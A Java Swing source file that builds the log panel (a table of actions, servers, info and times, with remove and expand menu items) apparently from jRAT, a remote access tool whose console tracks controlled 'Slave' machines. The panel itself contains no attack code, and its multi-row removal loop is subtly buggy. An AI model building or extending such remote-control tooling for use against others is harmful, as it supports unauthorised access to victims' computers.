package pro.jrat.ui.panels;

import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.ArrayList;
import java.util.List;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.ScrollPaneConstants;
import javax.swing.table.DefaultTableModel;

import pro.jrat.LogEntry;
import pro.jrat.Main;
import pro.jrat.Slave;
import pro.jrat.ui.frames.QuickFrame;
import pro.jrat.ui.renderers.table.LogTableRenderer;
import pro.jrat.utils.IconUtils;


@SuppressWarnings("serial")
public class PanelMainLog extends JPanel {

	public static final PanelMainLog instance = new PanelMainLog();

	private static final List<LogEntry> entries = new ArrayList<LogEntry>();

	public static QuickFrame frame;

	private JTable table;
	private DefaultTableModel model;
	private JMenuItem mntmExpand;

	public DefaultTableModel getModel() {
		return model;
	}

	public JTable getTable() {
		return table;
	}

	public List<LogEntry> getList() {
		return entries;
	}

	public PanelMainLog() {

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 450, Short.MAX_VALUE)
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.TRAILING)
				.addComponent(scrollPane, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 300, Short.MAX_VALUE)
		);

		table = new JTable();
		table.setDefaultRenderer(Object.class, new LogTableRenderer());
		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Action", "Server", "Info", "Time" }) {
			public boolean isCellEditable(int i, int i1) {
				return false;
			}
		});
		table.getColumnModel().getColumn(0).setPreferredWidth(126);
		table.getColumnModel().getColumn(1).setPreferredWidth(153);
		table.getColumnModel().getColumn(2).setPreferredWidth(205);
		table.getColumnModel().getColumn(3).setPreferredWidth(118);
		table.setRowHeight(25);
		table.getTableHeader().setReorderingAllowed(false);

		JPopupMenu popupMenu = new JPopupMenu();
		addPopup(scrollPane, popupMenu);
		addPopup(table, popupMenu);

		JMenuItem mntmRemove = new JMenuItem("Remove");
		mntmRemove.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				int[] rows = table.getSelectedRows();

				for (int row : rows) {
					model.removeRow(row);
				}
			}
		});
		mntmRemove.setIcon(new ImageIcon(PanelMainLog.class.getResource("/icons/window_minus.png")));
		popupMenu.add(mntmRemove);

		JMenuItem mntmRemoveAll = new JMenuItem("Remove all");
		mntmRemoveAll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				while (model.getRowCount() > 0) {
					model.removeRow(0);
				}
			}
		});
		mntmRemoveAll.setIcon(new ImageIcon(PanelMainLog.class.getResource("/icons/window_minus.png")));
		popupMenu.add(mntmRemoveAll);

		popupMenu.addSeparator();

		mntmExpand = new JMenuItem("Expand");
		mntmExpand.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				if (mntmExpand.getText().equals("Expand")) {
					mntmExpand.setText("Collapse");
					frame = new QuickFrame(instance);
					frame.setVisible(true);
					frame.setIcon(IconUtils.getIcon("log"));
					frame.setTitle("Log");
					frame.addClosingListener(new WindowAdapter() {
						@Override
						public void windowClosing(WindowEvent arg0) {
							mntmExpand.setText("Expand");
							frame.setVisible(false);
							frame.dispose();
							frame = null;
							Main.instance.tabbedPane.addTab("Log", IconUtils.getIcon("log"), instance, null);
						}
					});
				} else {
					mntmExpand.setText("Expand");
					frame.setVisible(false);
					frame.dispose();
					frame = null;
					Main.instance.tabbedPane.addTab("Log", IconUtils.getIcon("log"), instance, null);
				}
			}
		});
		mntmExpand.setIcon(new ImageIcon(PanelMainLog.class.getResource("/icons/window_import.png")));
		popupMenu.add(mntmExpand);

		scrollPane.setViewportView(table);
		setLayout(groupLayout);

	}

	public void addEntry(String action, Slave slave, String info) {
		LogEntry logEntry = new LogEntry(action, slave, info);
		getModel().insertRow(0, logEntry.getDisplayData());
	}

	private static void addPopup(Component component, final JPopupMenu popup) {
		component.addMouseListener(new MouseAdapter() {
			public void mousePressed(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}

			public void mouseReleased(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}

			private void showMenu(MouseEvent e) {
				popup.show(e.getComponent(), e.getX(), e.getY());
			}
		});
	}
}
